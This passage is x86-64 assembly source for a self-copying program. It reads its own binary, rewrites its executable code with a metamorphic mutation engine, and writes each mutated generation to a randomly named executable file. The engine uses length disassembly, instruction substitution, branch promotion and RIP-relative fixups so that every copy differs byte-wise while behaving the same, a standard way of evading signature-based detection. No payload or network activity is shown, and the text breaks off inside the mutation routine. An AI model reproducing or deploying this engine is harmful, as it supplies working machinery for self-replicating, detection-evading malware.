.intel_syntax noprefix
.globl _start

.section .text

_start:
    # Open SELF (argv[0]) 
    mov rdi, [rsp + 8]   
    mov rax, 2          # sys_open
    xor rsi, rsi        # O_RDONLY
    xor rdx, rdx
    syscall
    
    test rax, rax
    js Error
    mov r12, rax        # R12 = Source FD


    # Reserve Space on Stack 
    sub rsp, 16                 # Make room for filename (16 bytes to be safe/aligned)
    mov rdi, rsp                # RDI now points to our filename buffer

    # Generate Random Name Loop 
    mov rcx, 8                  # We want 8 random characters
    
RandomLoop:
    # Get a random number
    rdrand rax                  # Hardware random number generator (Intel/AMD)
    jnc RandomLoop              # If CF=0, hardware wasn't ready, try again

    # Map to 'a'-'z' (0x61 - 0x7A)
    # Fast modulo 26: (Random % 26) + 'a'
    xor rdx, rdx                # Clear RDX for division
    mov rbx, 26
    div rbx                     # Divide RAX by 26. Remainder is in RDX.
    
    add dl, 'a'                 # Add 'a' (0x61) to the remainder (0-25)
    
    # Store byte in buffer
    mov byte ptr [rdi], dl      # Write char to stack
    inc rdi                     # Move to next byte position
    
    loop RandomLoop             # Repeat 8 times

    # Null Terminate 
    mov byte ptr [rdi], 0       # Add \0 at the end

    # Prepare for sys_open 
    mov rdi, rsp                # RDI points to the start of our random string!
    
    # Now call open...
    mov rax, 2                  # sys_open
    mov rsi, 0x41               # O_CREAT | O_WRONLY
    mov rdx, 0777               # Mode
    syscall
    
    test rax, rax
    js Error
    mov r13, rax        # R13 = Dest FD

    # Allocate 64KB buffer on Stack 
    sub rsp, 65536      # 64KB buffer (binary ~5-16KB, leaves growth room)
    mov r14, rsp        # R14 = Buffer base pointer
    xor r15, r15        # R15 = Total bytes read (accumulator)

ReadLoop:
    mov rax, 0          # sys_read
    mov rdi, r12        # Source FD
    lea rsi, [r14 + r15] # Buffer + current offset
    mov rdx, 4096       # Read up to 4KB at a time
    syscall

    test rax, rax
    js Error            # Read error
    jz ReadDone         # 0 = EOF, all data read

    add r15, rax        # Accumulate total bytes read
    jmp ReadLoop

ReadDone:
    # R14 = buffer base, R15 = total file size in bytes
    # Buffer[0..R15-1] contains the entire binary

    # POLYMORPHISM / MUTATION ENGINE
    call mutation_engine

    # Write entire file
    xor rbx, rbx        # RBX = bytes written so far

WriteLoop:
    mov rax, 1          # sys_write
    mov rdi, r13        # Dest FD
    lea rsi, [r14 + rbx] # Buffer + write offset
    mov rdx, r15
    sub rdx, rbx        # Remaining bytes
    syscall

    test rax, rax
    js Error            # Write error

    add rbx, rax        # Advance write position
    cmp rbx, r15
    jb WriteLoop         # Continue if not all written

CloseAndExit:
    # Close files (optional but good)
    mov rax, 3
    mov rdi, r12
    syscall
    mov rax, 3
    mov rdi, r13
    syscall

    # Exit
    mov rax, 60
    xor rdi, rdi
    syscall

Error:
    mov rax, 60
    mov rdi, 1
    syscall

# MUTATION ENGINE 6-phase
# Called after reading entire file into buffer, before writing it out.
# Input:  R14 = buffer base, R15 = total file size
# Output: Buffer is modified (mutated code)
# Preserves: R14, R15
#
# Stack layout (24 KB local):
#   RSP+0     .. RSP+8191:   text_snapshot  (copy of .text for emit)
#   RSP+8192  .. RSP+24575:  InsnTable[2048] (8 bytes per entry)
#
# InsnTable entry (8 bytes):
#   +0  old_off    uint16   Original offset from .text start
#   +2  old_len    uint8    Original instruction length (from LDE)
#   +3  new_len    uint8    Length after mutation/promotion (= old_len if unchanged)
#   +4  flags      uint8    LDE flags (bits 0-5) | F_RIPREL (bit 6 = 0x40)
#   +5  mut_type   uint8    Size-mutation type (0=none, 1-6=see try_mutate_insn)
#   +6  new_off    uint16   Recomputed offset in output
mutation_engine:
    push r12
    push r13
    push rbp
    push rbx
    sub rsp, 24576                 # 8 KB snapshot + 16 KB InsnTable
    cld                            # ensure forward direction for rep movsb

    # find .text in buffer via ELF parse
    mov rdi, r14
    call find_text_section
    lea rbp, [r14 + rax]          # RBP = .text start in buffer

    # Read code_size from Store_section
    mov ebx, dword ptr [rbp + 8192 + 8]

    # Phase 1: DECODE Build InsnTable from LDE walk
    xor r12d, r12d                # R12 = byte offset into .text
    xor r13d, r13d                # R13 = instruction count

.phase1_loop:
    cmp r12d, ebx
    jae .phase1_done
    cmp r13d, 2048
    jae .me_lde_error             # too many instructions bail out

    lea rdi, [rbp + r12]
    call lde_insn_length          # RAX = length, R8 = flags
    test eax, eax
    jz .me_lde_error

    mov r9d, eax                  # R9  = instruction length (saved)
    mov r10d, r8d                 # R10 = LDE flags (saved)

    # Fill InsnTable entry
    lea rcx, [rsp + 8192 + r13*8]
    mov word ptr [rcx + 0], r12w  # old_off
    mov byte ptr [rcx + 2], r9b   # old_len
    mov byte ptr [rcx + 3], r9b   # new_len = old_len (no promotion yet)
    mov byte ptr [rcx + 4], r10b  # flags
    mov byte ptr [rcx + 5], 0     # junk_after = 0
    mov word ptr [rcx + 6], 0     # new_off (filled by compute_offsets)

    # RIP-relative detection
    test r10b, 0x01               # F_MODRM set?
    jz .phase1_next

    lea rdi, [rbp + r12]         # instruction start in buffer
    call check_riprel             # AL = 0x40 if RIP-relative, else 0
    lea rcx, [rsp + 8192 + r13*8]
    or byte ptr [rcx + 4], al    # merge F_RIPREL into flags

.phase1_next:
    add r12d, r9d                 # advance by instruction length
    inc r13d
    jmp .phase1_loop

.phase1_done:
    cmp r12d, ebx
    jne .me_lde_error             # walk didn't consume exactly code_size

    # Phase 2: MUTATE instruction substitution via InsnTable
    xor r12d, r12d

.phase2_loop:
    cmp r12d, r13d
    jae .phase2_done

    lea rsi, [rsp + 8192 + r12*8]  # RSI = InsnTable entry pointer
    movzx eax, word ptr [rsi + 0]  # old_off
    lea rdi, [rbp + rax]           # RDI = instruction pointer in buffer
    call try_mutate_insn

    inc r12d
    jmp .phase2_loop

.phase2_done:
    lea r9, [rsp + 8192]         # R9 = InsnTable base (for resolve_target)

    # Phase 4: RELAX iterative branch promotion + offset recompute
    # Repeats until all branch displacements fit their encoding.

.relax_again:
    # compute new offsets
    xor eax, eax                  # running offset
    xor ecx, ecx

.co_loop:
    cmp ecx, r13d
    jae .co_done
    lea rsi, [rsp + 8192 + rcx*8]
    mov word ptr [rsi + 6], ax    # new_off[i]
    movzx edx, byte ptr [rsi + 3] # new_len
    add eax, edx
    inc ecx
    jmp .co_loop

.co_done:
    mov r12d, eax                 # R12 = new_code_size

    # check each short branch for overflow
    xor ecx, ecx                  # index
    xor edx, edx                  # promoted flag

.relax_check:
    cmp ecx, r13d
    jae .relax_check_done

    lea rsi, [rsp + 8192 + rcx*8]
    test byte ptr [rsi + 4], 0x20  # F_BRANCH?
    jz .relax_next

    # Only short branches (imm8) can overflow
    movzx eax, byte ptr [rsi + 4]
    shr eax, 1
    and eax, 3
    cmp eax, 1                    # imm8?
    jne .relax_next               # near branch always fits

    # Skip if already promoted (new_len > old_len)
    movzx eax, byte ptr [rsi + 2]
    cmp byte ptr [rsi + 3], al
    ja .relax_next

    # Resolve target using displacement from buffer
    push rcx
    push rdx
    movzx eax, word ptr [rsi + 0]  # old_off
    movzx edi, byte ptr [rsi + 2]  # old_len
    lea r10d, [eax + edi - 1]      # pos of disp8
    movsx esi, byte ptr [rbp + r10] # old disp8 from buffer
    add edi, eax                    # old_off + old_len
    add esi, edi                    # target_off

    call resolve_target             # ESI -> EDI = target new_off

    pop rdx
    pop rcx
    lea rsi, [rsp + 8192 + rcx*8]  # re-read entry

    movzx eax, word ptr [rsi + 6]   # new_off[i]
    movzx r10d, byte ptr [rsi + 3]  # new_len[i]
    add eax, r10d
    sub edi, eax                    # new_disp

    # Check [-128, +127]
    cmp edi, -128
    jl .relax_promote
    cmp edi, 127
    jle .relax_next

.relax_promote:
    # Determine opcode type
    movzx eax, word ptr [rsi + 0]
    movzx eax, byte ptr [rbp + rax] # opcode byte

    cmp al, 0xEB
    je .relax_promote_jmp
    cmp al, 0xE0
    jae .relax_reduce_junk         # 0xE0-0xE3 LOOP/JECXZ: can't promote

    # Jcc short -> near: 2 bytes -> 6 bytes
    mov byte ptr [rsi + 3], 6      # new_len = 6
    and byte ptr [rsi + 4], 0xF9   # clear imm bits
    or byte ptr [rsi + 4], 0x04    # set imm32
    mov edx, 1                     # promoted = true
    jmp .relax_next

.relax_promote_jmp:
    # JMP short -> near: 2 bytes -> 5 bytes
    mov byte ptr [rsi + 3], 5
    and byte ptr [rsi + 4], 0xF9
    or byte ptr [rsi + 4], 0x04
    mov edx, 1
    jmp .relax_next

.relax_reduce_junk:
    # LOOP/JECXZ can't promote zero ALL size mod as safety fallback
    push rcx
    xor ecx, ecx
.rj_loop:
    cmp ecx, r13d
    jae .rj_done
    lea rax, [rsp + 8 + 8192 + rcx*8]  # +8 for push
    movzx edx, byte ptr [rax + 2] # old_len
    mov byte ptr [rax + 3], dl    # new_len = old_len (undo size mutation)
    mov byte ptr [rax + 5], 0     # mut_type = 0
    inc ecx
    jmp .rj_loop
.rj_done:
    pop rcx
    mov edx, 1                     # recompute needed
    jmp .relax_next

.relax_next:
    inc ecx
    jmp .relax_check

.relax_check_done:
    test edx, edx
    jnz .relax_again               # changed something -> recompute

    # Budget safety: ensure new_code_size <= 8192
    cmp r12d, 8192
    jbe .relax_ok

    # Overflow zero all and recompute
    xor ecx, ecx
.trim_loop:
    cmp ecx, r13d
    jae .trim_done
    lea rsi, [rsp + 8192 + rcx*8]
    movzx eax, byte ptr [rsi + 2] # old_len
    mov byte ptr [rsi + 3], al    # new_len = old_len (undo size mutation)
    mov byte ptr [rsi + 5], 0     # mut_type = 0
    inc ecx
    jmp .trim_loop
.trim_done:
    jmp .relax_again

.relax_ok:

    # Phase 5: SNAPSHOT copy mutated .text to stack temp area
    mov ecx, ebx                  # count = old code_size
    lea rsi, [rbp]                # src = .text in buffer
    lea rdi, [rsp]                # dst = text_snapshot on stack
    rep movsb

    # Phase 6: EMIT write instructions from snapshot to buffer
    lea r8, [rsp]                 # R8  = snapshot base
    lea r9, [rsp + 8192]         # R9  = InsnTable base
    xor r10d, r10d                # R10 = instruction index

.emit_loop:
    cmp r10d, r13d
    jae .emit_pad

    lea r11, [r9 + r10*8]        # R11 = &InsnTable[i]

    # Check for size mutation (mut_type != 0)
    cmp byte ptr [r11 + 5], 0
    jne .emit_size_mutation

    # Check if promoted branch (new_len > old_len, mut_type == 0)
    movzx eax, byte ptr [r11 + 2]  # old_len
    cmp byte ptr [r11 + 3], al     # new_len > old_len?
    ja .emit_promoted

    # Normal: copy old instruction bytes 
    movzx eax, word ptr [r11 + 0] # old_off
    movzx ecx, byte ptr [r11 + 2] # old_len (copy count)
    movzx edx, word ptr [r11 + 6] # new_off
    lea rsi, [r8 + rax]          # src = snapshot + old_off
    lea rdi, [rbp + rdx]         # dst = buffer + new_off
    rep movsb

    # Branch displacement patching 
    test byte ptr [r11 + 4], 0x20  # F_BRANCH?
    jz .emit_no_branch

    # Determine short (imm8=1) vs near (imm32=2)
    movzx eax, byte ptr [r11 + 4]
    shr eax, 1
    and eax, 3
    cmp eax, 1
    je .emit_branch_short

    # Near branch (imm32) 
    movzx eax, word ptr [r11 + 0]
    movzx ecx, byte ptr [r11 + 2]
    lea edx, [eax + ecx - 4]
    mov esi, dword ptr [r8 + rdx]
    add ecx, eax
    add esi, ecx

    call resolve_target

    movzx eax, word ptr [r11 + 6]
    movzx ecx, byte ptr [r11 + 3]
    add eax, ecx
    sub edi, eax

    movzx eax, word ptr [r11 + 6]
    movzx ecx, byte ptr [r11 + 3]
    lea eax, [eax + ecx - 4]
    mov dword ptr [rbp + rax], edi
    jmp .emit_no_branch

.emit_branch_short:
    # Short branch (imm8) 
    movzx eax, word ptr [r11 + 0]
    movzx ecx, byte ptr [r11 + 2]
    lea edx, [eax + ecx - 1]
    movsx esi, byte ptr [r8 + rdx]
    add ecx, eax
    add esi, ecx

    call resolve_target

    movzx eax, word ptr [r11 + 6]
    movzx ecx, byte ptr [r11 + 3]
    add eax, ecx
    sub edi, eax

    movzx eax, word ptr [r11 + 6]
    movzx ecx, byte ptr [r11 + 3]
    lea eax, [eax + ecx - 1]
    mov byte ptr [rbp + rax], dil

.emit_no_branch:
    # RIP-relative displacement patching 
    test byte ptr [r11 + 4], 0x40  # F_RIPREL?
    jz .emit_no_junk

    movzx eax, byte ptr [r11 + 4]
    shr eax, 1
    and eax, 3
    lea rcx, [rip + imm_size_lut]
    movzx eax, byte ptr [rcx + rax]
    movzx ecx, byte ptr [r11 + 2]
    sub ecx, eax
    sub ecx, 4

    movzx edx, word ptr [r11 + 0]
    add edx, ecx
    mov esi, dword ptr [r8 + rdx]

    movzx eax, word ptr [r11 + 0]
    movzx edx, byte ptr [r11 + 2]
    add eax, edx
    add esi, eax

    movzx eax, word ptr [r11 + 6]
    movzx edx, byte ptr [r11 + 3]
    add eax, edx

    sub esi, eax

    movzx eax, word ptr [r11 + 6]
    add eax, ecx
    mov dword ptr [rbp + rax], esi
    jmp .emit_no_junk

.emit_promoted:
    # Promoted branch: emit new encoding directly 
    movzx eax, word ptr [r11 + 0]   # old_off
    movzx esi, byte ptr [r8 + rax]  # opcode from snapshot
    movzx edx, word ptr [r11 + 6]   # new_off

    cmp sil, 0xEB
    je .emit_promoted_jmp

    # Promoted Jcc: 0x7x -> 0x0F 0x8x rel32 (6 bytes)
    mov byte ptr [rbp + rdx], 0x0F
    and sil, 0x0F
    or sil, 0x80
    mov byte ptr [rbp + rdx + 1], sil

    # Resolve target
    movzx eax, word ptr [r11 + 0]
    movzx ecx, byte ptr [r11 + 2]   # old_len (2)
    lea edi, [eax + ecx - 1]
    movsx esi, byte ptr [r8 + rdi]  # old disp8
    add ecx, eax
    add esi, ecx

    call resolve_target

    movzx eax, word ptr [r11 + 6]   # new_off
    movzx ecx, byte ptr [r11 + 3]   # new_len (6)
    add eax, ecx
    sub edi, eax

    movzx eax, word ptr [r11 + 6]
    mov dword ptr [rbp + rax + 2], edi
    jmp .emit_no_junk

.emit_promoted_jmp:
    # Promoted JMP: 0xEB -> 0xE9 rel32 (5 bytes)
    mov byte ptr [rbp + rdx], 0xE9

    movzx eax, word ptr [r11 + 0]
    movzx ecx, byte ptr [r11 + 2]
    lea edi, [eax + ecx - 1]
    movsx esi, byte ptr [r8 + rdi]
    add ecx, eax
    add esi, ecx

    call resolve_target

    movzx eax, word ptr [r11 + 6]
    movzx ecx, byte ptr [r11 + 3]   # new_len (5)
    add eax, ecx
    sub edi, eax

    movzx eax, word ptr [r11 + 6]
    mov dword ptr [rbp + rax + 1], edi

.emit_no_junk:
    inc r10d
    jmp .emit_loop

    # Size-mutation emitters construct new instruction from snapshot
.emit_size_mutation:
    movzx eax, byte ptr [r11 + 5]   # mut_type
    movzx ecx, word ptr [r11 + 0]   # old_off
    movzx edx, word ptr [r11 + 6]   # new_off
    lea rsi, [r8 + rcx]             # snapshot source
    lea rdi, [rbp + rdx]            # output dest

    cmp al, 1
    je .emit_inc2add
    cmp al, 2
    je .emit_add2inc
    cmp al, 3
    je .emit_dec2sub
    cmp al, 4
    je .emit_sub2dec
    cmp al, 5
    je .emit_test2cmp
    cmp al, 6
    je .emit_cmp2test
    jmp .emit_no_junk               # fallback (shouldn't happen)

.emit_inc2add:
    # INC r → ADD r, 1:  [REX?] FF modrm → [REX?] 83 modrm 01
    movzx ecx, byte ptr [rsi]
    cmp cl, 0x40
    jb .ei2a_no_rex
    cmp cl, 0x4F
    ja .ei2a_no_rex
    mov byte ptr [rdi], cl       # copy REX unchanged
    inc rsi
    inc rdi
.ei2a_no_rex:
    mov byte ptr [rdi], 0x83     # opcode: group-1 imm8
    movzx ecx, byte ptr [rsi + 1]  # ModR/M (after FF in snapshot)
    mov byte ptr [rdi + 1], cl   # copy ModR/M unchanged (reg=000 for ADD)
    mov byte ptr [rdi + 2], 0x01 # imm8 = 1
    jmp .emit_no_junk

.emit_add2inc:
    # ADD r,1 → INC r:  [REX?] 83 modrm 01 → [REX?] FF modrm
    movzx ecx, byte ptr [rsi]
    cmp cl, 0x40
    jb .ea2i_no_rex
    cmp cl, 0x4F
    ja .ea2i_no_rex
    mov byte ptr [rdi], cl
    inc rsi
    inc rdi
.ea2i_no_rex:
    mov byte ptr [rdi], 0xFF     # opcode: INC/DEC group
    movzx ecx, byte ptr [rsi + 1]  # ModR/M
    mov byte ptr [rdi + 1], cl   # copy unchanged (reg=000 → /0 = INC)
    jmp .emit_no_junk

.emit_dec2sub:
    # DEC r → SUB r,1:  [REX?] FF modrm(/1) → [REX?] 83 modrm'(/5) 01
    movzx ecx, byte ptr [rsi]
    cmp cl, 0x40
    jb .ed2s_no_rex
    cmp cl, 0x4F
    ja .ed2s_no_rex
    mov byte ptr [rdi], cl
    inc rsi
    inc rdi
.ed2s_no_rex:
    mov byte ptr [rdi], 0x83
    movzx ecx, byte ptr [rsi + 1]  # ModR/M: (11)(001)(rm) for DEC /1
    and cl, 0xC7                 # clear reg field (bits 5:3)
    or cl, 0x28                  # set reg = 101 (/5 = SUB)
    mov byte ptr [rdi + 1], cl
    mov byte ptr [rdi + 2], 0x01
    jmp .emit_no_junk

.emit_sub2dec:
    # SUB r,1 → DEC r:  [REX?] 83 modrm(/5) 01 → [REX?] FF modrm'(/1)
    movzx ecx, byte ptr [rsi]
    cmp cl, 0x40
    jb .es2d_no_rex
    cmp cl, 0x4F
    ja .es2d_no_rex
    mov byte ptr [rdi], cl
    inc rsi
    inc rdi
.es2d_no_rex:
    mov byte ptr [rdi], 0xFF
    movzx ecx, byte ptr [rsi + 1]  # ModR/M: (11)(101)(rm) for SUB /5
    and cl, 0xC7                 # clear reg field
    or cl, 0x08                  # set reg = 001 (/1 = DEC)
    mov byte ptr [rdi + 1], cl
    jmp .emit_no_junk

.emit_test2cmp:
    # TEST r,r → CMP r,0:  [REX?] 85 modrm → [REX?] 83 modrm'(/7) 00
    movzx ecx, byte ptr [rsi]
    cmp cl, 0x40
    jb .et2c_no_rex
    cmp cl, 0x4F
    ja .et2c_no_rex
    and cl, 0xFB                 # clear REX.R (bit 2) CMP /7 doesn't use reg
    mov byte ptr [rdi], cl
    inc rsi
    inc rdi
.et2c_no_rex:
    mov byte ptr [rdi], 0x83     # opcode: group-1 imm8
    movzx ecx, byte ptr [rsi + 1]  # ModR/M from TEST: (11)(reg)(rm) reg==rm
    and cl, 0x07                 # extract rm field
    or cl, 0xF8                  # new ModR/M: (11)(111)(rm) /7 = CMP
    mov byte ptr [rdi + 1], cl
    mov byte ptr [rdi + 2], 0x00 # imm8 = 0
    jmp .emit_no_junk

.emit_cmp2test:
    # CMP r,0 → TEST r,r:  [REX?] 83 modrm(/7) 00 → [REX?] 85 modrm'
    movzx ecx, byte ptr [rsi]
    cmp cl, 0x40
    jb .ec2t_no_rex
    cmp cl, 0x4F
    ja .ec2t_no_rex
    # Set REX.R = REX.B (TEST r,r needs same register in reg and rm)
    mov eax, ecx
    and eax, 0x01                # isolate REX.B
    shl eax, 2                   # shift to REX.R position (bit 2)
    or cl, al                    # set REX.R = REX.B
    mov byte ptr [rdi], cl
    inc rsi
    inc rdi
.ec2t_no_rex:
    mov byte ptr [rdi], 0x85     # opcode: TEST r/m, r
    movzx ecx, byte ptr [rsi + 1]  # ModR/M: (11)(111)(rm) from CMP /7
    and ecx, 0x07                # extract rm (bits 2:0)
    mov eax, ecx
    shl eax, 3                   # rm → reg position
    or ecx, eax                  # put rm in both reg and rm fields
    or ecx, 0xC0                 # mod = 11
    mov byte ptr [rdi + 1], cl
    jmp .emit_no_junk

.emit_pad:
    # NOP-fill from new_code_size to 8192
    lea rdi, [rbp + r12]         # start at .text + new_code_size
    mov ecx, 8192
    sub ecx, r12d
    jbe .emit_update              # skip if new_code_size >= 8192
    mov al, 0x90
    rep stosb

.emit_update:
    # update Store_section
    inc qword ptr [rbp + 8192]            # generation++
    mov dword ptr [rbp + 8192 + 8], r12d  # code_size = new_code_size

.me_cleanup:
    add rsp, 24576
    pop rbx
    pop rbp
    pop r13
    pop r12
    ret

.me_lde_error:
    jmp .me_cleanup

# FIND_TEXT_SECTION
# Locate the executable LOAD segment in an ELF64 file buffer.
# Input:  RDI = pointer to start of ELF file in memory
# Output: RAX = file offset (p_offset) of the executable LOAD segment
# Modifies: RAX, RCX, RDX, RSI
find_text_section:
    mov rax, [rdi + 0x20]         # e_phoff (program header table offset)
    movzx ecx, word ptr [rdi + 0x36]  # e_phentsize
    movzx edx, word ptr [rdi + 0x38]  # e_phnum
    lea rsi, [rdi + rax]          # RSI = first program header

.fts_loop:
    test edx, edx
    jz .fts_fail

    cmp dword ptr [rsi], 1        # p_type == PT_LOAD?
    jne .fts_next

    test dword ptr [rsi + 4], 1   # p_flags & PF_X (executable)?
    jz .fts_next

    mov rax, [rsi + 8]            # p_offset
    ret

.fts_next:
    add rsi, rcx                  # advance to next phdr
    dec edx
    jmp .fts_loop

.fts_fail:
    xor eax, eax                  # return 0 on failure
    ret

# LDE_INSN_LENGTH Length Disassembling Engine
# Compute the byte length of a single x86-64 instruction.
# Input:  RDI = pointer to first byte of instruction
# Output: RAX = instruction length in bytes
#         R8  = opcode flags from table (F_MODRM=0x01, F_BRANCH=0x20, etc.)
# Modifies: RAX, RCX, RDX, RSI, R8, R9, R10, R11
# Preserves: RBX, RBP, R12-R15
lde_insn_length:
    mov rsi, rdi                  # RSI = start pointer (for length calc)
    xor r9d, r9d                  # R9  = REX byte (0 = no REX)
    xor r10d, r10d                # R10 = internal flags:
                                  #   bit 0 = has 0x66 prefix
                                  #   bit 1 = is two-byte opcode (0x0F xx)

    # prefix scan
.Lpfx_loop:
    movzx eax, byte ptr [rdi]

    # Check REX prefix (0x40-0x4F in 64-bit mode)
    cmp al, 0x40
    jb .Lpfx_not_rex
    cmp al, 0x4F
    ja .Lpfx_not_rex
    mov r9d, eax                  # Save REX byte (last one wins)
    inc rdi
    jmp .Lpfx_loop

.Lpfx_not_rex:
    # Check legacy prefix via primary table
    lea rcx, [rip + lde_primary_flags]
    movzx edx, byte ptr [rcx + rax]
    test dl, 0x08                 # F_PREFIX?
    jz .Lpfx_done

    cmp al, 0x66
    jne .Lpfx_skip66
    or r10d, 1                    # has_66 = true
.Lpfx_skip66:
    inc rdi
    jmp .Lpfx_loop

.Lpfx_done:
    # opcode
    movzx r11d, byte ptr [rdi]   # R11 = opcode byte (saved for special cases)
    lea rcx, [rip + lde_primary_flags]
    movzx r8d, byte ptr [rcx + r11]  # R8 = flags from primary table
    inc rdi

    # Check for 0x0F two-byte escape
    test r8b, 0x10                # F_ESCAPE?
    jz .Lopc_done

    # Two-byte opcode: read second byte
    movzx r11d, byte ptr [rdi]   # R11 = second opcode byte
    lea rcx, [rip + lde_secondary_flags]
    movzx r8d, byte ptr [rcx + r11]  # R8 = flags from secondary table
    inc rdi
    or r10d, 2                    # is_two_byte = true

.Lopc_done:
    # special cases, primary opcodes only
    test r10d, 2                  # is_two_byte?
    jnz .Lno_special

    cmp r11b, 0xC2                # RET imm16
    je .Lspecial_imm16
    cmp r11b, 0xCA                # RETF imm16
    je .Lspecial_imm16
    cmp r11b, 0xC8                # ENTER imm16, imm8
    je .Lspecial_enter
    jmp .Lno_special

.Lspecial_imm16:
    add rdi, 2                    # 2-byte immediate
    jmp .Ldone

.Lspecial_enter:
    add rdi, 3                    # imm16 + imm8 = 3 bytes
    jmp .Ldone

.Lno_special:
    # ModR/M decoding
    # EDX will hold modrm.reg for F6/F7 special case (-1 if no modrm)
    mov edx, -1
    test r8b, 0x01                # F_MODRM?
    jz .Lmodrm_done

    movzx eax, byte ptr [rdi]    # Read ModR/M byte
    inc rdi

    # Extract fields: mod (bits 7-6), reg (bits 5-3), rm (bits 2-0)
    mov ecx, eax
    shr ecx, 6                   # ECX = mod
    mov edx, eax
    shr edx, 3
    and edx, 7                   # EDX = reg (for F6/F7 check later)
    and eax, 7                   # EAX = rm

    cmp ecx, 3                   # mod == 3? (register-register, no memory)
    je .Lmodrm_done

    # memory operand, check for SIB byte
    cmp eax, 4                   # rm == 4 → SIB present
    jne .Lno_sib

    # Read SIB byte
    movzx eax, byte ptr [rdi]    # Reuse EAX (rm is no longer needed)
    inc rdi
    and eax, 7                   # EAX = SIB.base

    # mod==0 with SIB.base==5 → disp32 (no base register)
    cmp ecx, 0
    jne .Ldisp_by_mod             # mod != 0: use standard displacement
    cmp eax, 5
    jne .Lmodrm_done              # mod==0, base!=5: no displacement
    add rdi, 4                    # disp32
    jmp .Lmodrm_done

.Lno_sib:
    # No SIB. Check for RIP-relative: mod==0 && rm==5
    cmp ecx, 0
    jne .Ldisp_by_mod
    cmp eax, 5
    jne .Lmodrm_done              # mod==0, rm!=5: no displacement
    add rdi, 4                    # RIP-relative disp32
    jmp .Lmodrm_done

.Ldisp_by_mod:
    cmp ecx, 1
    je .Ldisp8
    # mod == 2: disp32
    add rdi, 4
    jmp .Lmodrm_done
.Ldisp8:
    inc rdi                       # disp8

.Lmodrm_done:
    # immediate handling

    # F6 group 3: TEST has imm8, others don't
    test r10d, 2                  # is_two_byte? skip if so
    jnz .Limm_normal
    cmp r11b, 0xF6
    jne .Lcheck_f7
    cmp edx, 1                   # reg <= 1 → TEST (has immediate)
    ja .Ldone                     # reg > 1 → NOT/NEG/MUL/DIV (no immediate)
    inc rdi                       # imm8 for TEST r/m8, imm8
    jmp .Ldone

.Lcheck_f7:
    # F7 group 3: TEST has imm32 (or imm16 with 0x66)
    cmp r11b, 0xF7
    jne .Limm_normal
    cmp edx, 1
    ja .Ldone                     # reg > 1: no immediate

    # TEST r/m, imm32 (or imm16 with 0x66 prefix)
    test r10d, 1                  # has_66?
    jz .Lf7_full
    test r9b, 0x08                # REX.W overrides 0x66
    jnz .Lf7_full
    add rdi, 2                    # imm16
    jmp .Ldone
.Lf7_full:
    add rdi, 4                    # imm32
    jmp .Ldone

.Limm_normal:
    # standard immediate, decoded from flags bits 1-2
    # 00 = none, 01 = imm8, 10 = imm32, 11 = imm64
    mov ecx, r8d
    shr ecx, 1
    and ecx, 3

    cmp ecx, 1
    je .Limm_1
    cmp ecx, 2
    je .Limm_4
    cmp ecx, 3
    je .Limm_8
    jmp .Ldone                    # ecx == 0: no immediate

.Limm_1:
    inc rdi                       # imm8
    jmp .Ldone

.Limm_8:
    add rdi, 8                    # imm64
    jmp .Ldone

.Limm_4:
    add rdi, 4                    # imm32

    # MOV r64, imm64 check (0xB8-0xBF with REX.W)
    test r10d, 2                  # is_two_byte?
    jnz .Lcheck_66
    cmp r11b, 0xB8
    jb .Lcheck_66
    cmp r11b, 0xBF
    ja .Lcheck_66
    test r9b, 0x08                # REX.W?
    jz .Lcheck_66
    add rdi, 4                    # upgrade imm32 → imm64 (+4 more bytes)
    jmp .Ldone

.Lcheck_66:
    # 0x66 prefix shrinks imm32 to imm16
    test r10d, 1                  # has_66?
    jz .Ldone
    test r10d, 2                  # is_two_byte?
    jnz .Ldone
    test r9b, 0x08                # REX.W overrides 0x66
    jnz .Ldone

    # Only certain primary opcodes have their imm32 reduced by 0x66:
    # 0x05,0x0D,0x15,0x1D,0x25,0x2D,0x35,0x3D (OP rAX, imm32)
    # 0x68 (PUSH imm32), 0x69 (IMUL r,r/m,imm32)
    # 0x81 (Grp1 r/m, imm32), 0xA9 (TEST rAX, imm32), 0xC7 (MOV r/m, imm32)
    cmp r11b, 0x3D
    ja .L66_high
    # Low range: check (opcode & 7) == 5
    mov ecx, r11d
    and ecx, 7
    cmp ecx, 5
    je .Limm_shrink2
    jmp .Ldone
.L66_high:
    cmp r11b, 0x68
    je .Limm_shrink2
    cmp r11b, 0x69
    je .Limm_shrink2
    cmp r11b, 0x81
    je .Limm_shrink2
    cmp r11b, 0xA9
    je .Limm_shrink2
    cmp r11b, 0xC7
    je .Limm_shrink2
    jmp .Ldone

.Limm_shrink2:
    sub rdi, 2                    # imm32 → imm16
    # fall through to .Ldone

.Ldone:
    mov rax, rdi
    sub rax, rsi                  # length = current_pos - start_pos
    ret

# TRY_MUTATE_INSN
# Tries instruction substitution in order: same-size opcode swaps,
# size-changing mutations, direction-bit encoding swap, commutative swap.
# First match wins.
#
# Dispatch order:
#   M3 swap:     opcode in {0x31,0x29,0x85,0x09,0x21} with mod==3 & reg==rm
#                → same-size swap (XOR↔SUB, TEST↔OR, AND→TEST)
#   INC→ADD r,1: 0xFF /0 (mut_type=1, +1 byte)
#   DEC→SUB r,1: 0xFF /1 (mut_type=3, +1 byte)
#   ADD r,1→INC: 0x83 /0 imm8=1 (mut_type=2, -1 byte)
#   SUB r,1→DEC: 0x83 /5 imm8=1 (mut_type=4, -1 byte)
#   CMP r,0→TEST:0x83 /7 imm8=0 (mut_type=6, -1 byte)
#   TEST→CMP r,0: 0x85 with reg==rm (mut_type=5, +1 byte, only if M3 said no)
#   direction swap: ALU (0x00-0x3F) or MOV (0x88-0x8B) with mod==3
#   commutative swap: TEST/XCHG (0x84-0x87) with mod==3
#
# Input:  RDI = instruction start in buffer
#         RSI = this instruction's InsnTable entry
# Output: same-size mutations modify bytes in-place at [RDI]
#         size mutations write new_len into [RSI+3], mut_type into [RSI+5]
# Modifies: RAX, RCX, RDX
# Preserves: RBX, RBP, R8-R15
try_mutate_insn:
    # skip optional REX prefix (0x40-0x4F)
    xor edx, edx                  # EDX = REX byte (0 if none)
    movzx eax, byte ptr [rdi]
    cmp al, 0x40
    jb .tmi_got_opcode
    cmp al, 0x4F
    ja .tmi_got_opcode
    mov edx, eax                  # save REX byte
    inc rdi                       # advance past REX
    movzx eax, byte ptr [rdi]    # read actual opcode

.tmi_got_opcode:
    # EAX = opcode, EDX = REX (0 if none), RDI -> opcode byte in buffer
    # RSI = InsnTable entry pointer

    # same-size M3 substitution, reg==rm required
    cmp al, 0x31
    je .tmi_m3_check
    cmp al, 0x29
    je .tmi_m3_check
    cmp al, 0x85
    je .tmi_m3_check
    cmp al, 0x09
